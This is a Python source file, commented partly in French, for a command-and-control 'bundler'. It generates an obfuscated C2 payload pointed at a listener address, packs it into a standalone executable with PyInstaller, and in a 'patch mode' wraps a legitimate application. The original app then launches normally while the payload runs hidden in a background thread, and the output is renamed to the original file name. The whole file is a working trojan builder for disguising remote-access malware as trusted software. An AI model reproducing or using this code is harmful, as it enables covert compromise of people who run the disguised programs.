#!/usr/bin/env python3
"""
Complete C2 Bundler - Full Featured
- Payload generation with obfuscation
- PyInstaller bundling
- Cross-platform support (Windows/macOS/Linux)
- Upload support for custom payloads
"""

import os
import sys
import subprocess
import tempfile
import shutil
from pathlib import Path
from typing import Optional


class C2Bundler:
    """Bundler complet avec support upload et personnalisation"""

    def __init__(self):
        self.dist_dir = Path.cwd() / "dist"
        self.dist_dir.mkdir(exist_ok=True)
        self.spec_dir = self.dist_dir / "specs"
        self.spec_dir.mkdir(exist_ok=True)
        self.build_dir = self.dist_dir / "build"
        self.build_dir.mkdir(exist_ok=True)
        self.resources_dir = self.dist_dir / "resources"
        self.resources_dir.mkdir(exist_ok=True)

    def generate_payload(
        self,
        listener_ip: str,
        listener_port: int,
        obfuscation_level: int,
        debug_mode: bool = False,
    ) -> str:
        """Génère le payload C2 complet"""
        sys.path.insert(0, str(Path(__file__).parent))
        from c2_payload_complete import C2PayloadGenerator

        print(f"[*] Generating C2 payload...")
        print(f"[*] Listener: {listener_ip}:{listener_port}")
        print(f"[*] Obfuscation Level: {obfuscation_level}")
        if debug_mode:
            print(f"[*] DEBUG MODE: Enabled (logs to %TEMP%/c2_debug.log)")

        generator = C2PayloadGenerator(listener_ip, listener_port, obfuscation_level)
        payload_code = generator.generate()

        # Enable debug mode if requested
        if debug_mode:
            payload_code = payload_code.replace(
                "self.debug_mode = False", "self.debug_mode = True"
            )

        print(f"[+] Payload generated ({len(payload_code)} bytes)")
        return payload_code

    def save_payload(self, payload_code: str) -> str:
        """Sauvegarde le payload dans un fichier temporaire"""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(payload_code)
            temp_file = f.name
        print(f"[+] Temp file: {temp_file}")
        return temp_file

    def bundle_with_pyinstaller(
        self, temp_file: str, platform: str = "windows", add_resources: bool = False
    ) -> bool:
        """Exécute PyInstaller pour créer l'executable"""
        print(f"[*] Running PyInstaller (this may take 30-60 seconds)...")
        print(f"[*] Target platform: {platform}")

        output_name = "c2_payload"
        self._cleanup_previous_bundle(output_name)

        cmd = [
            "pyinstaller",
            "--onefile",
            "-y",
            "--distpath",
            str(self.dist_dir),
            "--specpath",
            str(self.spec_dir),
            "--workpath",
            str(self.build_dir),
            "--name",
            output_name,
        ]

        # Platform-specific options
        # --windowed = pas de console (stealth) mais masque les erreurs
        # Pour debug: désactiver --windowed et activer debug_mode dans payload
        if platform == "windows":
            # IMPORTANT: Ne PAS ajouter --windowed pour que l'utilisateur voit les erreurs de debug
            # cmd.extend(["--windowed"])
            pass

            # Add resources folder if patch mode
        if add_resources and self.resources_dir.exists():
            resources_files = list(self.resources_dir.glob("*"))
            print(f"[*] Patch mode: checking resources at {self.resources_dir}")
            print(f"[*] Resources directory exists: {self.resources_dir.exists()}")
            print(f"[*] Files found: {resources_files}")
            if resources_files:
                # On ajoute le dossier entier via --add-data
                # CRITICAL: PyInstaller syntax is --add-data=SOURCE:DEST (with equals sign!)
                # Separator: Windows uses ';', Unix uses ':'
                # But when compiling ON macOS, PyInstaller expects ':' syntax regardless of target
                # The compiled Windows exe will extract resources correctly at runtime
                resources_path = str(self.resources_dir)
                # Always use ':' when running PyInstaller on Unix (macOS/Linux)
                separator = ":"
                add_data_arg = f"--add-data={resources_path}{separator}resources"
                cmd.append(add_data_arg)
                print(f"[*] Adding resources folder: {self.resources_dir}")
                print(f"[*] Files included: {[f.name for f in resources_files]}")
                print(f"[*] PyInstaller add-data: {add_data_arg}")
            else:
                print(f"[!] WARNING: No files found in resources directory!")
        else:
            if add_resources:
                print(
                    f"[!] WARNING: add_resources=True but resources_dir does not exist: {self.resources_dir}"
                )
            else:
                print(f"[*] Skipping resources (add_resources={add_resources})")

        cmd.append(temp_file)

        print(f"[*] Command: {' '.join(cmd)}")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            if result.stdout:
                print(f"[*] PyInstaller stdout:\n{result.stdout}")
            if result.stderr:
                print(f"[*] PyInstaller stderr:\n{result.stderr}")

            if result.returncode != 0:
                print(f"[!] PyInstaller failed with return code {result.returncode}")
                # Ne pas supprimer le temp file en cas d'erreur pour debug
                return False

            # Supprimer seulement si succès
            try:
                os.unlink(temp_file)
                print(f"[*] Cleaned up temp file: {temp_file}")
            except:
                pass

            return True

        except subprocess.TimeoutExpired:
            print(f"[!] PyInstaller timeout (300s)")
            return False
        except Exception as e:
            print(f"[!] Error running PyInstaller: {str(e)}")
            import traceback

            print(traceback.format_exc())
            return False

    def verify_executable(self, platform: str = "windows") -> bool:
        """Vérifie que l'executable a été créé correctement"""
        output_name = "c2_payload"

        # Sur macOS, PyInstaller crée un binaire macOS même si on demande Windows
        # Pour Windows, utiliser GitHub Actions
        if platform == "windows":
            # Cherche .exe d'abord (depuis Windows)
            exe_path = self.dist_dir / f"{output_name}.exe"
            if not exe_path.exists():
                # Fallback: cherche binaire macOS (création sur macOS)
                exe_path = self.dist_dir / output_name
        else:
            exe_path = self.dist_dir / output_name

        if exe_path.exists():
            size_mb = exe_path.stat().st_size / 1024 / 1024
            print(f"[+] Executable created: {exe_path}")
            print(f"[+] Size: {size_mb:.2f} MB")
            print(f"[+] C2 payload hidden inside!")

            # Vérifier que c'est un vrai exécutable
            if exe_path.stat().st_mode & 0o111:
                print(f"[+] Status: READY FOR DEPLOYMENT")
                return True
            else:
                print(f"[!] Not executable (permissions)")
                return False
        else:
            print(f"[!] Executable not found at {exe_path}")
            if self.dist_dir.exists():
                print(f"[!] Contents of dist: {list(self.dist_dir.iterdir())}")
            return False

    def create_patched_payload(
        self,
        listener_ip: str,
        listener_port: int,
        obfuscation_level: int,
        platform: str,
        target_file: str,
    ) -> bool:
        """Crée un payload qui exécute le fichier original + C2 en arrière-plan"""
        try:
            print(f"[*] PATCH MODE: Creating wrapper for {Path(target_file).name}")

            # Vérifier que le fichier existe
            target_path = Path(target_file)
            if not target_path.exists():
                print(f"[!] Target file not found: {target_file}")
                return False

            # Réinitialiser les ressources pour éviter les collisions
            self._reset_resources_dir()

            # Copier le fichier original dans resources
            original_file = self.resources_dir / target_path.name
            print(f"[*] Copying original file to: {original_file}")

            shutil.copy2(target_file, original_file)
            print(
                f"[+] Original file saved ({original_file.stat().st_size / 1024:.2f} KB)"
            )

            # Générer le payload C2
            payload_code = self.generate_payload(
                listener_ip, listener_port, obfuscation_level
            )

            # Créer le wrapper qui lance original + C2
            wrapper_code = self._create_wrapper_code(
                original_file.name, payload_code, platform
            )

            # Sauvegarder le wrapper
            temp_file = self.save_payload(wrapper_code)

            # Bundle avec PyInstaller (avec resources)
            print(f"[*] Bundling patched payload...")
            if not self.bundle_with_pyinstaller(
                temp_file, platform, add_resources=True
            ):
                print("[!] FAILED: PyInstaller bundling failed")
                return False

            # Renommer l'exe final avec le nom original
            output_name = "c2_payload"
            if platform == "windows":
                source = self.dist_dir / f"{output_name}.exe"
                if not source.exists():
                    print(f"[*] No .exe found, checking macOS binary...")
                    source = self.dist_dir / output_name
                dest = self.dist_dir / target_path.name
            else:
                source = self.dist_dir / output_name
                dest = self.dist_dir / target_path.stem

            print(f"[*] Looking for output: {source}")
            print(f"[*] Dist dir contents: {list(self.dist_dir.iterdir())}")

            if source.exists():
                print(f"[+] Found bundled executable: {source}")
                if dest.exists():
                    print(f"[*] Removing existing destination: {dest}")
                    if dest.is_dir():
                        shutil.rmtree(dest)
                    else:
                        dest.unlink()
                print(f"[*] Renaming {source.name} -> {dest.name}")
                source.rename(dest)
                size_mb = dest.stat().st_size / 1024 / 1024
                print(f"[+] Patched executable: {dest}")
                print(f"[+] Size: {size_mb:.2f} MB")
                print(f"[+] Original app will run normally, C2 hidden in background!")
                print(f"[+] Status: READY FOR DEPLOYMENT")
                return True
            else:
                print(f"[!] Executable not found at: {source}")
                print(f"[!] Expected file does not exist")
                return False

        except Exception as e:
            print(f"[!] FAILED: {str(e)}")
            import traceback

            print(traceback.format_exc())
            return False

    def _cleanup_previous_bundle(self, output_name: str) -> None:
        """Remove previous bundle artifacts so PyInstaller can overwrite."""
        targets = [
            self.dist_dir / output_name,
            self.dist_dir / f"{output_name}.exe",
            self.dist_dir / f"{output_name}.app",
        ]

        for target in targets:
            if target.exists():
                try:
                    if target.is_dir():
                        shutil.rmtree(target)
                    else:
                        target.unlink()
                except Exception as exc:
                    print(f"[!] Warning: failed to remove {target}: {exc}")

    def _reset_resources_dir(self) -> None:
        """Ensure resources directory exists and is clean before copying files."""
        if self.resources_dir.exists():
            for item in self.resources_dir.iterdir():
                try:
                    if item.is_dir():
                        shutil.rmtree(item)
                    else:
                        item.unlink()
                except Exception as exc:
                    print(f"[!] Warning: failed to remove resource {item}: {exc}")

        # Always ensure the directory exists after cleaning
        self.resources_dir.mkdir(parents=True, exist_ok=True)

    def _create_wrapper_code(
        self, original_filename: str, payload_code: str, platform: str
    ) -> str:
        """Crée le code wrapper qui lance l'original + C2 sans utiliser f-string"""

        # Indenter le payload correctement
        indented_payload = "\n".join(
            "        " + line if line.strip() else line
            for line in payload_code.strip().split("\n")
        )

        # Construire le wrapper ligne par ligne (pas de f-string pour éviter les problèmes de quotes)
        wrapper_lines = [
            "import os",
            "import sys",
            "import subprocess",
            "import threading",
            "import time",
            "from pathlib import Path",
            "",
            "# WRAPPER MAIN - executes original app + C2 in background",
            "if getattr(sys, 'frozen', False):",
            "    bundle_dir = Path(sys._MEIPASS)",
            "else:",
            "    bundle_dir = Path(__file__).parent",
            "",
            "# PyInstaller --add-data TARGET:resources puts files in _MEIPASS/resources/",
            "# But sometimes it just puts them at root, so check both",
            'original_app_resources = bundle_dir / "resources" / "'
            + original_filename
            + '"',
            'original_app_root = bundle_dir / "' + original_filename + '"',
            "",
            "def _log(msg):",
            "    try:",
            "        temp_dir = os.getenv('TEMP') or os.getenv('TMP') or os.getenv('LOCALAPPDATA') or '.'",
            "        log_file = os.path.join(temp_dir, 'c2_wrapper.log')",
            "        ts = time.strftime('%Y-%m-%d %H:%M:%S')",
            "        with open(log_file, 'a', encoding='utf-8') as f:",
            "            f.write('[' + ts + '] ' + str(msg) + '\n')",
            "        print('[WRAPPER] ' + str(msg))",
            "    except Exception as log_exc:",
            "        try:",
            "            print('[WRAPPER][LOG ERROR] ' + str(log_exc))",
            "        except:",
            "            pass",
            "",
            "def run_original_app():",
            "    try:",
            "        _log('=== ORIGINAL APP LAUNCH ===')",
            "        _log('Bundle dir: ' + str(bundle_dir))",
            "        all_files = list(bundle_dir.glob('*'))",
            "        _log('Bundle dir contents: ' + str([f.name for f in all_files]))",
            "        _log('Checking resources/: ' + str((bundle_dir / 'resources').exists()))",
            "        if (bundle_dir / 'resources').exists():",
            "            res_files = list((bundle_dir / 'resources').glob('*'))",
            "            _log('Resources contents: ' + str([f.name for f in res_files]))",
            "        ",
            "        # Try resources folder first",
            "        _log('Checking: ' + str(original_app_resources))",
            "        if original_app_resources.exists():",
            "            _log('Found in resources, executing')",
            "            if sys.platform.startswith('win'):",
            "                subprocess.Popen([str(original_app_resources)], shell=False, creationflags=0x08000000)",
            "            else:",
            "                subprocess.Popen([str(original_app_resources)], shell=False)",
            "            return",
            "        ",
            "        # Try root directory",
            "        _log('Not found in resources, checking root: ' + str(original_app_root))",
            "        if original_app_root.exists():",
            "            _log('Found at root, executing')",
            "            if sys.platform.startswith('win'):",
            "                subprocess.Popen([str(original_app_root)], shell=False, creationflags=0x08000000)",
            "            else:",
            "                subprocess.Popen([str(original_app_root)], shell=False)",
            "            return",
            "        ",
            "        _log('ERROR: Original app not found at: ' + str(original_app_resources) + ' or ' + str(original_app_root))",
            "    except Exception as e:",
            "        _log('Error: ' + str(e))",
            "        import traceback",
            "        _log(traceback.format_exc())",
            "        try:",
            "            if sys.platform.startswith('win'):",
            "                os.startfile(str(original_app_resources))",
            "            else:",
            "                subprocess.Popen([str(original_app_resources)], shell=True)",
            "        except:",
            "            pass",
            "",
            "def run_c2_payload():",
            "    try:",
            "        _log('C2 starting')",
            "        time.sleep(3)",
        ]

        # Ajouter le payload indenté
        wrapper_lines.extend(indented_payload.split("\n"))

        # Ajouter le reste du wrapper
        wrapper_lines.extend(
            [
                "    except Exception as e:",
                "        _log('C2 error: ' + str(e))",
                "",
                "if __name__ == '__main__':",
                "    _log('Starting C2 payload in background thread')",
                "    c2_thread = threading.Thread(target=run_c2_payload, daemon=False)",
                "    c2_thread.start()",
                "    _log('Waiting 5 seconds for C2 to initialize...')",
                "    time.sleep(5)",
                "    _log('Now launching original application')",
                "    run_original_app()",
                "    _log('Original app launched, wrapper complete')",
            ]
        )

        return "\n".join(wrapper_lines)

    def create_bundled_payload(
        self,
        listener_ip: str,
        listener_port: int,
        obfuscation_level: int,
        platform: str = "windows",
        patch_file: Optional[str] = None,
    ) -> bool:
        """Process complet: génération + bundling + vérification"""
        try:
            # Si patch_file est fourni, utiliser le mode patch
            if patch_file:
                return self.create_patched_payload(
                    listener_ip, listener_port, obfuscation_level, platform, patch_file
                )

            # Sinon, mode standalone normal
            # Step 1: Generate payload
            payload_code = self.generate_payload(
                listener_ip, listener_port, obfuscation_level
            )

            # Step 2: Save payload
            temp_file = self.save_payload(payload_code)

            # Step 3: Bundle with PyInstaller
            if not self.bundle_with_pyinstaller(temp_file, platform):
                print("[!] FAILED: PyInstaller bundling failed")
                return False

            # Step 4: Verify executable
            if not self.verify_executable(platform):
                print("[!] FAILED: Executable verification failed")
                return False

            print(f"[+] SUCCESS: C2 payload bundled successfully for {platform}!")
            return True

        except Exception as e:
            print(f"[!] FAILED: {str(e)}")
            import traceback

            print(traceback.format_exc())
            return False


def create_bundled_payload(
    listener_ip: str,
    listener_port: int,
    obfuscation_level: int,
    platform: str = "windows",
    patch_file: Optional[str] = None,
) -> bool:
    """Fonction compatibilité - utilisée par bundler_tab.py et GitHub Actions"""
    bundler = C2Bundler()
    return bundler.create_bundled_payload(
        listener_ip, listener_port, obfuscation_level, platform, patch_file
    )


if __name__ == "__main__":
    # Test avec configuration par défaut
    success = create_bundled_payload("192.168.1.40", 4444, 2, "windows")
    sys.exit(0 if success else 1)
